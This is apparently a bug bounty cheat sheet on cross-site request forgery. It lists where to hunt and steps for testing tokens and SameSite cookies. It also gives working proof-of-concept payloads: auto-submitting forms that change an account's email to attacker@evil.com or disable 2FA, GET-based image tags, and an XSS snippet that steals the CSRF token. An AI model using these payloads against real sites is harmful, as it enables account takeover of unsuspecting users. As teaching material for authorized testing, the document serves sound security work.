---
tags: [bugbounty, vuln/csrf, cheatsheet, p2, p3]
aliases: [Cross-Site Request Forgery, CSRF, XSRF]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# CSRF — Cross-Site Request Forgery

> [!tldr] Hunter Summary
> **What:** Force victim's browser to make authenticated requests to the target.
> **Impact:** State-change actions on behalf of victim — email change, password change, money transfer.
> **Best targets:** Account settings endpoints, password/email change, any state-change action.
> **Time to triage:** Check for CSRF token or SameSite cookie. 5 min to test.

---

## Where to Hunt

| Signal | Look for |
|--------|----------|
| No CSRF token | State-change POST/PUT/DELETE without `csrf_token`, `_token`, `X-CSRF-Token` |
| Weak CSRF token | Token present but not validated server-side; token tied to session but not request |
| SameSite=None | Cookies with `SameSite=None; Secure` — cross-site requests allowed |
| JSON endpoints | Some devs assume JSON = CSRF-safe (wrong if `text/plain` is accepted) |
| GraphQL mutations | Mutations often lack CSRF protection |
| Sensitive actions | Password change, email change, 2FA disable, payment, account delete |

---

## Step-by-Step Hunt

### Step 1 — Find state-change requests
Focus on: settings pages, profile updates, payment pages, admin actions.

In Burp, look for:
- `POST /account/email/change`
- `POST /settings/password`
- `DELETE /account`
- `POST /transfer`

### Step 2 — Check for CSRF token
Look in:
- Form hidden fields: `<input name="csrf_token" value="...">`
- Request headers: `X-CSRF-Token`, `X-Requested-With`
- Request body: `_token=`, `authenticity_token=`

**If absent:** test directly.

**If present:** 
- Remove token — does it still work?
- Use empty token value `csrf_token=`
- Use someone else's valid token
- Change token length (keep same format)
- Try CSRF via GET if POST fails

### Step 3 — Test CORS / Origin header
```bash
curl -X POST https://target.com/account/email \
  -H "Origin: https://evil.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=attacker@evil.com" \
  -b "session=VICTIM_SESSION"
```

### Step 4 — Check SameSite cookie attribute
```bash
curl -sI https://target.com | grep -i set-cookie
# Look for: SameSite=Strict / Lax / None
# Lax: GET-based CSRF still works
# None: full CSRF possible from cross-site
```

### Step 5 — Build PoC

```html
<!-- Standard form-based CSRF -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/account/email/change" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com"/>
    <input type="hidden" name="confirm_email" value="attacker@evil.com"/>
  </form>
</body>
</html>
```

```html
<!-- For JSON endpoints (Content-Type: text/plain trick) -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/api/user/update" method="POST" 
        enctype="text/plain">
    <input name='{"email":"attacker@evil.com","x":"' value='"}'>
  </form>
</body>
</html>
```

```html
<!-- CSRF via img (GET-based) -->
<img src="https://target.com/logout">
<img src="https://target.com/account/delete?confirm=true">
```

```html
<!-- CSRF via iframe + SameSite=Lax bypass (top-level navigation via link) -->
<a href="https://target.com/oauth/authorize?client_id=X&redirect_uri=EVIL">Click me</a>
```

### Step 6 — Test 2FA disable CSRF
Many apps protect 2FA enable but forget 2FA disable:
```html
<form action="https://target.com/settings/2fa/disable" method="POST">
  <input type="hidden" name="confirm" value="true"/>
</form>
```

### Step 7 — Combine with XSS for same-site CSRF
If target has XSS, use it to read CSRF token then perform the action:
```js
// In your XSS payload:
fetch('/account/settings').then(r=>r.text()).then(html=>{
  const token = html.match(/csrf_token['"]\s*value=['"]([\w-]+)/)[1];
  fetch('/account/email/change', {
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:`email=attacker@evil.com&csrf_token=${token}`
  });
});
```

---

## 2025-2026 Updates

> [!info] New CSRF surface (2025-2026)
> - **SameSite=Lax bypass via top-level navigation:** GET requests via `<a>` tag or 307 redirect carry SameSite=Lax cookies
> - **Login CSRF:** Force victim to log in as attacker → victim unknowingly uses attacker's session
> - **OAuth login CSRF (missing state):** Attacker initiates OAuth flow, stops after getting code, sends URL to victim — victim's account linked to attacker's
> - **GraphQL mutation CSRF:** Often completely unprotected; `Content-Type: application/json` doesn't prevent CSRF if `text/plain` also accepted
> - **WebSocket CSRF:** Initial handshake upgrade request uses cookies — no CSRF token checked

---

## Chain Ideas

| CSRF → | Result |
|--------|--------|
| CSRF on email change | → Password reset → ATO |
| CSRF on 2FA disable | → ATO (bypasses MFA) |
| CSRF on OAuth unlink | → Remove victim's login method |
| CSRF login | → Session fixation → victim uses attacker's session |
| CSRF + XSS | → Read CSRF token, escalate impact |

---

## Tools

| Tool | Use |
|------|-----|
| Burp CSRF PoC generator | Right-click request → Engagement tools → Generate CSRF PoC |
| `csrf-scanner` | Automated CSRF detection |

---

## References

- PortSwigger CSRF — https://portswigger.net/web-security/csrf
- OWASP CSRF — https://owasp.org/www-community/attacks/csrf
